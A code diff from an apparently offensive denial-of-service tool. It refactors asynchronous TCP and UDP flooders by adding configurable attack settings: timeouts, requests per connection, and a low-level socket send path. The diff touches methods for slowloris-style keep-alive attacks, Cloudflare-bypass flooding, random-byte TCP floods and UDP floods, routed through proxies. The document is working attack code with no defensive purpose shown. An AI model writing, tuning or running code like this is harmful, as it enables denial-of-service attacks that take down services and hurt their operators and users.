@@ -2,10 +2,11 @@ import aiohttp
 import aiohttp_socks
 import asyncio
 
-import logging
 from contextlib import suppress
+from copy import copy
 import errno
 from itertools import cycle
+import logging
 from math import log2, trunc
 from os import urandom as randbytes
 from random import choice
@@ -862,12 +863,42 @@ class HttpFlood:
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
 
 
-# XXX: there's literally no need for this class to exist
+class AttackSettings:
+    low_level_transport: bool
+    connect_timeout_seconds: float
+    drain_timeout_seconds: float
+    close_timeout_seconds: float
+    requests_per_connection: int
+
+    def __init__(
+        self,
+        *,
+        low_level_transport: bool = False,
+        connect_timeout_seconds: float = SOCK_TIMEOUT,
+        drain_timeout_seconds: float = 0.1,
+        close_timeout_seconds: float = 1.0,
+        requests_per_connection: int = 1024,
+    ):
+        self.low_level_transport = low_level_transport
+        self.connect_timeout_seconds = connect_timeout_seconds
+        self.drain_timeout_seconds = drain_timeout_seconds
+        self.close_timeout_seconds = close_timeout_seconds
+        self.requests_per_connection = requests_per_connection
+
+    def with_options(self, **kwargs) -> "AttackSettings":
+        settings = copy(self)
+        for k, v in kwargs.items():
+            assert hasattr(settings, k)
+            setattr(settings, k, v)
+        return settings
+
+
 class AsyncTcpFlood(HttpFlood):
 
-    def __init__(self, *args, loop=None):
+    def __init__(self, *args, loop=None, settings: Optional[AttackSettings] = None):
         super().__init__(*args)
         self._loop = loop
+        self._settings = settings or AttackSettings()
 
     async def run(self) -> bool:
         assert self._loop is not None, "Event loop has to be set to run async flooder"
@@ -881,7 +912,7 @@ class AsyncTcpFlood(HttpFlood):
         server_hostname = "" if is_tls else None
         proxy_url: str = self._proxies.pick_random()
         if proxy_url:
-            reader, writer = await aiohttp_socks.open_connection(
+            conn = aiohttp_socks.open_connection(
                 proxy_url=proxy_url,
                 host=self._target.host,
                 port=self._target.port,
@@ -889,32 +920,48 @@ class AsyncTcpFlood(HttpFlood):
                 server_hostname=server_hostname,
             )
         else:
-            reader, writer = await asyncio.open_connection(
+            conn = asyncio.open_connection(
                 host=self._target.host, port=self._target.port, ssl=ssl_ctx,
                 server_hostname=server_hostname)
+        reader, writer = await asyncio.wait_for(
+            conn, timeout=self._settings.connect_timeout_seconds)
+        self._stats.track_open_connection()
         return reader, writer
 
-    # XXX: config for timeouts
+    async def _close_connection(self, writer: asyncio.StreamWriter) -> None:
+        if self._settings.low_level_transport:
+            writer.get_extra_info("socket")._sock.close()
+            self._stats.track_close_connection()
+        else:
+            writer.close()
+            closed = asyncio.create_task(asyncio.wait_for(
+                writer.wait_closed(), timeout=self._settings.close_timeout_seconds))
+            closed.add_done_callback(lambda _: self._stats.track_close_connection())
+            await closed
+
+    async def _send_packet(self, writer: asyncio.StreamWriter, payload: bytes) -> None:
+        if self._settings.low_level_transport:
+            sock = writer.get_extra_info("socket")._sock
+            await asyncio.wait_for(
+                self._loop.sock_sendall(sock, payload),
+                timeout=self._settings.drain_timeout_seconds
+            )
+        else:
+            writer.write(payload)
+            await asyncio.wait_for(
+                writer.drain(), timeout=self._settings.drain_timeout_seconds)
+        self._stats.track(1, len(payload))
+
     async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
-        rpc = rpc or self._rpc
+        rpc = rpc or self._settings.requests_per_connection
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
-        self._stats.track_open_connection()
-        # XXX: testing performance of low-level API
-        # sock = writer.get_extra_info("socket")._sock
+        reader, writer = await self.open_connection()
         try:
-            for ind in range(rpc):
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=1)
-                # XXX: testing performance of low-level API
-                # await asyncio.wait_for(self._loop.sock_sendall(sock, payload), timeout=1)
-                self._stats.track(1, packet_size)
+            for _ in range(rpc):
+                await self._send_packet(writer, payload)
                 packets_sent += 1
         finally:
-            writer.close()
-            # XXX: i'm curious if there's a way to add "on_close" callback or something
-            self._stats.track_close_connection()
-            await asyncio.wait_for(writer.wait_closed(), timeout=1)
+            await self._close_connection(writer)
         return packets_sent > 0
 
     # XXX: again, with functions it's just a partial
@@ -1031,97 +1078,73 @@ class AsyncTcpFlood(HttpFlood):
     async def CFBUAM(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
-        self._stats.track_open_connection()
+        reader, writer = await self.open_connection()
         try:
-            writer.write(payload)
-            await asyncio.wait_for(writer.drain(), timeout=1)
-            self._stats.track(1, packet_size)
+            await self._send_packet(writer, payload)
             packets_sent += 1
             await asyncio.sleep(5.01)
             ts = time()
-            for _ in range(self._rpc):
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=1)
-                self._stats.track(1, packet_size)
+            for _ in range(self._settings.requests_per_connection):
+                await self._send_packet(writer, payload)
                 packets_sent += 1
                 if time() > ts + 120: break
         finally:
-            writer.close()
-            self._stats.track_close_connection()
-            await asyncio.wait_for(writer.wait_closed(), timeout=1)
+            await self._close_connection(writer)
         return packets_sent > 0
 
     @scale_attack(factor=5)
     async def EVEN(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
-        self._stats.track_open_connection()
+        reader, writer = await self.open_connection()
         try:
-            for _ in range(self._rpc):
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=1)
+            for _ in range(self._settings.requests_per_connection):
+                await self._send_packet(writer, payload)
                 packets_sent += 1
-                self._stats.track(1, packet_size)
+                # XXX: have to setup buffering properly for this attack to be effective
                 await asyncio.wait_for(reader.read(1), timeout=1)
         finally:
-            writer.close()
-            self._stats.track_close_connection()
-            await asyncio.wait_for(writer.wait_closed(), timeout=1)
+            await self._close_connection(writer)
         return packets_sent > 0
 
     async def OVH(self) -> int:
         payload: bytes = self.generate_payload()
-        return await self._generic_flood(payload, rpc=min(self._rpc, 5))
+        return await self._generic_flood(
+            payload, rpc=min(self._settings.requests_per_connection, 5))
     
     @scale_attack(factor=5)
     async def AVB(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
-        self._stats.track_open_connection()
+        reader, writer = await self.open_connection()
         try:
-            for _ in range(self._rpc):
-                await asyncio.sleep(max(self._rpc / 1000, 1))
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=1)
+            for _ in range(self._settings.requests_per_connection):
+                await asyncio.sleep(max(self._settings.requests_per_connection / 1000, 1))
+                await self._send_packet(writer, payload)
                 packets_sent += 1
-                self._stats.track(1, packet_size)
         finally:
-            writer.close()
-            self._stats.track_close_connection()
-            await asyncio.wait_for(writer.wait_closed(), timeout=1)
+            await self._close_connection(writer)
         return packets_sent > 0
 
     @scale_attack(factor=20)
     async def SLOW(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
-        self._stats.track_open_connection()
+        reader, writer = await self.open_connection()
         try:
-            for _ in range(self._rpc):
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=1)
+            for _ in range(self._settings.requests_per_connection):
+                await self._send_packet(writer, payload)
                 packets_sent += 1
-                self._stats.track(1, packet_size)
             while True:
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=1)
+                await self._send_packet(writer, payload)
                 packets_sent += 1
-                self._stats.track(1, packet_size)
                 await asyncio.wait_for(reader.read(1), timeout=1)
-                for i in range(self._rpc):
+                for i in range(self._settings.requests_per_connection):
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
-                    writer.write(keep)
-                    await asyncio.wait_for(writer.drain(), timeout=1)
-                    self._stats.track(0, len(keep))
-                    await asyncio.sleep(self._rpc / 15)
+                    await self._send_packet(writer, keep)
+                    await asyncio.sleep(self._settings.requests_per_connection / 15)
         finally:
-            writer.close()
-            self._stats.track_close_connection()
-            await asyncio.wait_for(writer.wait_closed(), timeout=1)
+            await self._close_connection(writer)
         return packets_sent > 0
 
     # XXX: with default buffering setting this methods is gonna suck :(
@@ -1129,49 +1152,41 @@ class AsyncTcpFlood(HttpFlood):
     async def DOWNLOADER(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
-        self._stats.track_open_connection()
+        reader, writer = await self.open_connection()
         try:
-            for _ in range(self._rpc):
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=1)
+            for _ in range(self._settings.requests_per_connection):
+                await self._send_packet(writer, payload)
                 packets_sent += 1
-                self._stats.track(1, packet_size)
                 while True:
+                    # XXX: move this to config
                     await asyncio.sleep(.01)
+                    # XXX: timeout
                     data = await reader.read(1)
                     if not data: break
-                writer.write(b'0')
-                await asyncio.wait_for(writer.drain(), timeout=1)
+                await self._send_packet(writer, b'0')
         finally:
-            writer.close()
-            self._stats.track_close_connection()
-            await asyncio.wait_for(writer.wait_closed(), timeout=1)
+            await self._close_connection(writer)
         return packets_sent > 0
 
     async def TCP(self) -> bool:
         packets_sent, packet_size = 0, 1024
-        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
-        self._stats.track_open_connection()
+        reader, writer = await self.open_connection()
         try:
-            for _ in range(self._rpc):
+            for _ in range(self._settings.requests_per_connection):
                 payload: bytes = randbytes(packet_size)
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=1)
-                self._stats.track(1, packet_size)
+                await self._send_packet(writer, payload)
                 packets_sent += 1
         finally:
-            writer.close()
-            self._stats.track_close_connection()
-            await asyncio.wait_for(writer.wait_closed(), timeout=1)
+            await self._close_connection(writer)
         return packets_sent > 0
 
 
 class AsyncUdpFlood(Layer4):
 
-    def __init__(self, *args, loop=None):
+    def __init__(self, *args, loop=None, settings: Optional[AttackSettings] = None):
         super().__init__(*args)
         self._loop = loop
+        self._settings = settings or AttackSettings()
 
     async def run(self) -> bool:
         assert self._loop is not None, "Event loop has to be set to run async flooder"
@@ -1181,11 +1196,14 @@ class AsyncUdpFlood(Layer4):
         packets_sent, packet_size = 0, 1024
         with socket(AF_INET, SOCK_DGRAM) as sock:
             await asyncio.wait_for(
-                self._loop.sock_connect(sock, self._target), timeout=SOCK_TIMEOUT)
+                self._loop.sock_connect(sock, self._target),
+                timeout=self._settings.connect_timeout_seconds)
             while True:
                 packet = randbytes(packet_size)
                 try:
-                    await asyncio.wait_for(self._loop.sock_sendall(sock, packet), timeout=1)
+                    await asyncio.wait_for(
+                        self._loop.sock_sendall(sock, packet),
+                        timeout=self._settings.drain_timeout_seconds)
                 except OSError as exc:
                     if exc.errno == errno.ENOBUFS:
                         await asyncio.sleep(0.5)
@@ -1196,7 +1214,7 @@ class AsyncUdpFlood(Layer4):
         return packets_sent > 0
 
 
-def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None, loop=None):
+def main(url, ip, method, event, proxies, stats, refl_li_fn=None, loop=None, settings=None):
     if method not in Methods.ALL_METHODS:
         exit(f"Method {method} Not Found")
 
@@ -1206,13 +1224,14 @@ def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None, loop
             url,
             ip,
             method,
-            rpc,
+            None, # XXX: previously used for "rpc"
             event,
             USERAGENTS,
             REFERERS,
             proxies,
             stats,
             loop=loop,
+            settings=settings,
         )
 
     if method in Methods.LAYER4_METHODS:
@@ -1241,4 +1260,13 @@ def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None, loop
             if not ref:
                 exit("Empty Reflector File ")
 
-        return AsyncUdpFlood((ip, port), ref, method, event, proxies, stats, loop=loop)
+        return AsyncUdpFlood(
+            (ip, port),
+            ref,
+            method,
+            event,
+            proxies,
+            stats,
+            loop=loop,
+            settings=settings
+        )
